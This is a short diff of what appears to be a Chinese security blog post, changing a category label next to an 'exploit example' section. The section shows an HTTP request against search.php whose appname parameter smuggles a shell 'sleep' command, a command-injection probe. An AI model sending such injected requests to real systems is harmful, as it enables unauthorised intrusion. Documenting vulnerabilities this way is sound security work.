@@ -95,7 +95,7 @@ else if($action == 'showtask'){
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机科学
+工程与技术
 
 ```
 GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
